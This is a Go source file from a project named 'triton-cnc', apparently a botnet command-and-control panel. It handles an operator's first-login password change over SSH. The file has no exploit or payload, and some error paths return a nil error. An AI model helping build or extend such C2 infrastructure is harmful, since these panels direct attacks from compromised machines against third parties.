package views

import (
	"log"
	"time"
	"triton-cnc/core/mysql"
	"triton-cnc/core/models/client/terminal"
	"triton-cnc/core/models/util"

	"golang.org/x/crypto/ssh"
	"golang.org/x/term"
)


func Login_NewUser(channel ssh.Channel, conn *ssh.ServerConn, User *database.User) error {
	error,_ := terminal.Banner("login-newuser", User, channel, true, false, nil)
	if error != nil {
		log.Println(error)
		return error
	}

	NewTerm := term.NewTerminal(channel, "\x1b[0mNew password>\x1b[38;5;16m")
	NewPassword, error := NewTerm.ReadLine()
	if error != nil {
		time.Sleep(5 * time.Second)
		channel.Close()
		return error
	}

	NewTermconfirm := term.NewTerminal(channel, "\x1b[0mConfirm new password>\x1b[38;5;16m")
	NewConfirmPassword, error := NewTermconfirm.ReadLine()
	if error != nil {
		time.Sleep(5 * time.Second)
		channel.Close()
		return error
	}

	if NewPassword != NewConfirmPassword {
		channel.Write([]byte("\x1b[0mPasswords do NOT match\r\n"))
		time.Sleep(5 * time.Second)
		channel.Close()
		return error
	}

	if len(NewPassword) <= 5 {
		channel.Write([]byte("\x1b[0mPassword must be longer then `5`\r\n"))
		time.Sleep(5 * time.Second)
		channel.Close()
		return error
	}

	errors := database.EditFeild(User.Username, "password", util.HashPassword(NewPassword))
	if !errors {
		channel.Write([]byte("\x1b[0mFailed to update password correctly\r\n"))
		time.Sleep(5 * time.Second)
		channel.Close()
		return error
	}

	errors = database.EditFeild(User.Username, "NewUser", "0")
	if !errors {
		channel.Write([]byte("\x1b[0mFailed to update password correctly\r\n"))
		time.Sleep(5 * time.Second)
		channel.Close()
		return error
	}

	channel.Write([]byte("\x1b[0mPassword correctly updated, redirecting in `5` seconds\r\n"))

	time.Sleep(5 * time.Second)

	return nil
	
	
}